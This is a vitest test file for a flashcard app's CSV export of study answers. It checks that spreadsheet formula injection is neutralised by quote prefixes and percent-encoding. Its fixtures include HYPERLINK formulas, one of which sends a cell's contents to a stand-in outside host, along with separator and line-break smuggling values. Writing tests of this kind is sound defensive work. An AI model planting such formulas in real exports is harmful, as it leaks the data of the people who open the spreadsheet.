// SPDX-FileCopyrightText: 2026 Anton Wiklund and Solid Memo contributors
//
// SPDX-License-Identifier: MIT

import { describe, expect, it } from "vitest";
import type { Answer } from "./answer";
import { answersCsv } from "./answerCsv";

const first: Answer = {
  id: "answer-b",
  deckUrl: "https://pod.example/i/catalog.ttl#deck-1",
  cardUrl: "https://pod.example/i/decks/deck-1.ttl#se",
  direction: "front-to-back",
  grade: 4,
  answeredAt: "2026-10-01T10:00:00.000Z",
  studyDay: "2026-10-01",
  nextIntervalDays: 1,
};

describe("answersCsv", () => {
  it("writes a header and a row an answer, oldest first, an answer without a mode a recalled one, and blank where it was not measured", () => {
    const review: Answer = {
      ...first,
      id: "answer-c",
      answeredAt: "2026-10-02T09:00:00.000Z",
      studyDay: "2026-10-02",
      priorIntervalDays: 1,
      nextIntervalDays: 6,
      recallMillis: 2400,
      gradeMillis: 800,
      priorDue: "2026-10-02",
      utcOffsetMinutes: -330,
    };
    const wrong: Answer = {
      ...first,
      id: "answer-a",
      direction: "back-to-front",
      grade: 1,
      mode: "multiple-choice",
      chosenDistractor: "https://pod.example/i/decks/deck-1.ttl#se-oslo",
    };
    expect(answersCsv([review, first, wrong])).toBe(
      [
        "answered_at,study_day,deck,card,direction,grade,mode,prior_interval_days,next_interval_days,chosen_distractor,recall_millis,grade_millis,prior_due,utc_offset_minutes",
        "2026-10-01T10:00:00.000Z,2026-10-01,https://pod.example/i/catalog.ttl#deck-1,https://pod.example/i/decks/deck-1.ttl#se,back-to-front,1,multiple-choice,,1,https://pod.example/i/decks/deck-1.ttl#se-oslo,,,,",
        "2026-10-01T10:00:00.000Z,2026-10-01,https://pod.example/i/catalog.ttl#deck-1,https://pod.example/i/decks/deck-1.ttl#se,front-to-back,4,recall,,1,,,,,",
        "2026-10-02T09:00:00.000Z,2026-10-02,https://pod.example/i/catalog.ttl#deck-1,https://pod.example/i/decks/deck-1.ttl#se,front-to-back,4,recall,1,6,,2400,800,2026-10-02,-330",
        "",
      ].join("\r\n"),
    );
  });

  it("puts a quote mark before text a spreadsheet would read as a formula, but not before a negative number", () => {
    const formula: Answer = {
      ...first,
      priorDue: '=HYPERLINK("https://other.example/?"&C2,"Open")',
      utcOffsetMinutes: -60,
    };
    expect(answersCsv([formula]).split("\r\n")[1]).toBe(
      '2026-10-01T10:00:00.000Z,2026-10-01,https://pod.example/i/catalog.ttl#deck-1,https://pod.example/i/decks/deck-1.ttl#se,front-to-back,4,recall,,1,,,,"\'=HYPERLINK(""https://other.example/?""&C2,""Open"")",-60',
    );
    for (const [text, written] of [
      ["+1", "'+1"],
      ["-1", "'-1"],
      ["@SUM(A1)", "'@SUM(A1)"],
      ["\tx", "%09x"],
      ["x=1", "x=1"],
    ]) {
      const row = answersCsv([{ ...first, chosenDistractor: text! }]).split("\r\n")[1]!;
      expect(row.split(",")[9]).toBe(written);
    }
  });

  it("percent-encodes what a spreadsheet could read as a separator or a line break, so that no cell of such a reading starts as a formula", () => {
    const formula = "=HYPERLINK(CHAR(104)&CHAR(116)&A2)";
    const encoded = "%3B=HYPERLINK(CHAR(104)&CHAR(116)&A2)%3B";
    const planted: Answer = {
      ...first,
      deckUrl: `https://pod.example/i/catalog.ttl#d;${formula};`,
      cardUrl: `https://pod.example/i/cards.ttl#c;${formula};`,
      chosenDistractor: `https://pod.example/i/cards.ttl#o;${formula};`,
    };
    const row = answersCsv([planted]).split("\r\n")[1]!;
    expect(row).toBe(
      `2026-10-01T10:00:00.000Z,2026-10-01,https://pod.example/i/catalog.ttl#d${encoded},https://pod.example/i/cards.ttl#c${encoded},front-to-back,4,recall,,1,https://pod.example/i/cards.ttl#o${encoded},,,,`,
    );
    expect(row.split(";")).toEqual([row]);
    for (const [text, written] of [
      [";=1", "%3B=1"],
      ["\r=1", "%0D=1"],
      ["\n=1", "%0A=1"],
      ["a\r\n=1", "a%0D%0A=1"],
      ['a;"b"', '"a%3B""b"""'],
      ["a\u061b=1", "a%D8%9B=1"],
      ["a\u060c=1", "a%D8%8C=1"],
      ["a\t=1", "a%09=1"],
      ["a|=1", "a%7C=1"],
      ["a =1", "a%20=1"],
      ["a\u2028=1", "a%E2%80%A8=1"],
      ["\uff1d1", "%EF%BC%9D1"],
      ["a\ud800;=1", "a%EF%BF%BD%3B=1"],
      ["kongerække-왕-\u0645\u0644\u0643-e\u0301-1", "kongerække-왕-\u0645\u0644\u0643-e\u0301-1"],
    ]) {
      const line = answersCsv([{ ...first, chosenDistractor: text! }]).split("\r\n");
      expect(line).toHaveLength(3);
      expect(line[1]!.split(",")[9]).toBe(written);
    }
  });

  it("quotes a field with a comma or a quote in it, and writes the header alone for no answer", () => {
    const odd = { ...first, cardUrl: 'https://pod.example/i/a,"b".ttl#se' };
    expect(answersCsv([odd]).split("\r\n")[1]).toContain(
      ',"https://pod.example/i/a,""b"".ttl#se",',
    );
    expect(answersCsv([])).toBe(
      "answered_at,study_day,deck,card,direction,grade,mode,prior_interval_days,next_interval_days,chosen_distractor,recall_millis,grade_millis,prior_due,utc_offset_minutes\r\n",
    );
  });
});
